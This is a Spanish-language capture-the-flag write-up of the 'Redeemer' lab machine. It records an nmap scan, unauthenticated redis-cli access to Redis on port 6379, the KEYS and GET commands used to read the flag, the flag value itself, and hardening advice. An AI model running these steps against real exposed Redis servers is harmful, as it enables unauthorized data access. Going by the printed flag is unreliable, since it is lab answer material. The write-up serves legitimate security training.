---
categories:
  - "[[Ciber]]"
tags:
  - vms
  - pentesting
  - starting-point
created: 2026-02-16
---
## 1. Información General

- **Máquina:** Redeemer
    
- **IP:** 10.129.9.138
    
- **SO:** Linux
    
- **Dificultad:** Very Easy
    
- **Fecha:** 16/02/2026
    

## 2. Resumen Ejecutivo

Se comprometió un servidor de base de datos Redis en entorno Linux debido a la ausencia total de controles de autenticación en el puerto 6379. Esta vulnerabilidad crítica permitió el acceso remoto no autorizado, facilitando la enumeración y extracción de información confidencial almacenada en la base de datos.

## 3. Enumeración (Reconocimiento)

### 3.1 Escaneo de Red

- **Comando utilizado:** `nmap -sV -p- 10.129.9.138 `
    
- **Puertos Abiertos:**
    
| **Puerto** | **Servicio** | **Versión**                 | **Estado** |
| ---------- | ------------ | --------------------------- | ---------- |
| 6379       | redis        | Redis key-value store 5.0.7 | Abierto    |

### 3.2 Análisis de Servicios

- **Tecnologías Detectadas:** Redis key-value store 5.0.7
    
- **Hallazgos Clave:** El servicio Redis está expuesto públicamente y configurado sin requerir credenciales, permitiendo la conexión directa y ejecución de comandos administrativos.
    

## 4. Análisis de Vulnerabilidades

- **Vulnerabilidad Principal:** Acceso no autenticado a la base de datos (Redis Unauthenticated Access).
    

## 5. Explotación (Gaining Access)

- **Razonamiento:** Aprovechar la falta de autenticación del servicio Redis para conectar remotamente, enumerar los espacios de claves (keyspaces) y extraer los datos confidenciales.
    
- **Pasos de Reproducción:**
    
    1. Conexión remota al servidor: `redis-cli -h 10.129.9.138`
        
    2. Recopilar información del servidor y sus bases de datos (se identifica db0 con 4 claves): `info`
	
	3. Seleccionar la base de datos por defecto y listar todas las claves disponibles: `KEYS *`

	4. Extraer el valor almacenado en la clave objetivo: `GET flag`
        
- **Evidencia:**
	10.129.9.138:6379> info
	\# Keyspace
	db0:keys=4,expires=0,avg_ttl=0
	10.129.9.138:6379> KEYS *
	\1) "numb"
	\2) "flag"
	\3) "temp"
	\4) "stor"
10.129.9.138:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
10.129.9.138:6379> 
	
    

## 6. Post-Explotación (Escalada de Privilegios)
    
- **Prueba de Compromiso (Flags):**
        
    - 🚩 **Root Flag:** `03e1d2b376c37ab3f5319922053953eb`
        

## 7. Remediación y Conclusiones

- **Criticidad:** 
    
- **Recomendaciones:**
	- **Autenticación (requirepass):** Editar el archivo `redis.conf` y configurar una contraseña robusta utilizando la directiva `requirepass <contraseña>`.
	    
	- **Restricción de Red (bind):** Si el servicio Redis no necesita ser accedido desde el exterior, modificar la directiva `bind` en `redis.conf` a `bind 127.0.0.1` para que solo escuche conexiones locales.
	    
	- **Renombrar Comandos Peligrosos:** Deshabilitar o renombrar comandos críticos de Redis (como `CONFIG`, `FLUSHDB`, `FLUSHALL`) mediante la directiva `rename-command` en el archivo de configuración.